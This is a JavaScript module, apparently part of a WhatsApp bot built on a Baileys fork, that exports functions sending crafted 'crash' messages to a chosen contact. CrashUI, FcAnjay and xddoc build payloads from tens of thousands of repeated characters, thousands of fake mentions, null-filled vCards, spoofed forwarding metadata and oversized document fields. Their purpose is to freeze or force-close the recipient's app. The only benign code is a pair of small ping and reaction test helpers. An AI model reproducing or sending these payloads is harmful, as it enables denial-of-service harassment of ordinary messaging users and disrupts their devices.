import { generateWAMessageFromContent, proto } from '@rexxhayanasi/elaina-baileys';
import chalk from 'chalk';
import fs from 'fs';
import path from 'path';

export async function CrashUI(sock, jid, ptcp = false) {
  const msg = generateWAMessageFromContent(jid, {
    extendedTextMessage: {
      text: '🩸⃟⃨〫⃰‣ ⁖𝐓𝐳𝐗 ‌𖣂︎‌ 𝐓›𝐞𝐚‌𝐦⃜' + "ꦾ".repeat(50000),
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
        ),
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: true,
        isForwarded: true,
        forwardingScore: 9999
      }
    }
  }, {})
  
  await sock.relayMessage(jid, msg.message, ptcp ? 
    { messageId: msg.key.id } :
    { participant: { jid: jid }, messageId: msg.key.id })
  
  console.log(chalk.green("─────「 ⏤ CrashUI Ex3cute 」─────"))
}

export async function TestPing(sock, jid) {
    const start = Date.now();
    await sock.sendMessage(jid, { text: 'Testing Ping...' });
    const latency = Date.now() - start;
    await sock.sendMessage(jid, { text: `✅ Pong! Latency: ${latency}ms` });
    console.log(chalk.blue(`[TEST] Ping sent to ${jid} (${latency}ms)`));
}

export async function TestReaction(sock, jid, key) {
    await sock.sendMessage(jid, {
        react: {
            text: "⚡",
            key: key
        }
    });
    console.log(chalk.yellow(`[TEST] Reaction sent to ${jid}`));
}

export async function FcAnjay(sock, jid) {
  try {
    const imagePath = path.join(process.cwd(), 'image', 'photo01.jpg');
    let thumb = fs.existsSync(imagePath) ? fs.readFileSync(imagePath) : Buffer.alloc(0);
    
    const displayName = "exoticsXRaven" + "ោ៝".repeat(41);
    const vcard = `BEGIN:VCARD\nVERSION:3.0\nN:item1.TEL;waid=5521992999999:+55 219-9299-9999\nitem1.X-ABLabel:Server\nX-WA-BIZ-NAME:${"\\u0000".repeat(41)}\nEND:VCARD`;
    
    const msg = generateWAMessageFromContent(jid, {
      contactMessage: {
        displayName,
        vcard,
        contextInfo: {
          participant: jid,
          mentionedJid: [jid],
          remoteJid: jid,
          forwardingScore: 6666,
          isForwarded: true,
          quotedMessage: {
            contactMessage: {
              displayName: "ExoticsProfileXendMile", 
              vcard: vcard
            },
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "13135550002@s.whatsapp.net"
          },
          dataSharingContext: {
            showMmDisclosure: true
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "5521992999999@newsletter",
            serverMessageId: 1,
            newsletterName: "x"
          },
          externalAdReply: {
            title: "Sbr Bg" + "ោ៝".repeat(9741),
            mediaType: 2,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            containsAutoReply: true,
            body: "©Hummp",
            thumbnail: thumb,
            sourceUrl: "",
            sourceId: sock.generateMessageTag(),
            ctwaClid: "ctwaClid",
            ref: "ref",
            clickToWhatsappCall: true,
            ctaPayload: "ctaPayload",
            disableNudge: false,
            originalimgLink: "https://t.me/XHanxZzz"
          }
        }
      }
    }, {
      quoted: {
        key: {
          participant: "5521992999999@s.whatsapp.net",
          remoteJid: jid,
          fromMe: false
        },
        message: {
          contactMessage: {
            displayName: "ZdX-AmpunSepuh",
            vcard: vcard
          }
        }
      }
    });
    
    await sock.relayMessage(jid, msg.message, {
      participant: { jid: jid },
      messageId: msg.key.id
    });
    
    console.log(chalk.magenta("─────「 ⏤ FcAnjay Ex3cute 」─────"))
  } catch (error) {
    console.error("Error in FcAnjay:", error);
  }
}

export async function xddoc(sock, jid) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `Undefined`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "\u0000" + "⃪݉⃟̸̷".repeat(1000), // Cleaned up for reliability
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Alwaysaqioo The Juftt️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };

   try {
    await sock.relayMessage(jid, messagePayload, { participant: { jid: jid } });
    console.log(chalk.cyan(`─────「 ⏤ xddoc Ex3cute 」─────`));
  } catch (error) {
    console.error(`Gagal mengirim xddoc ke ${jid}:`, error);
  }
}
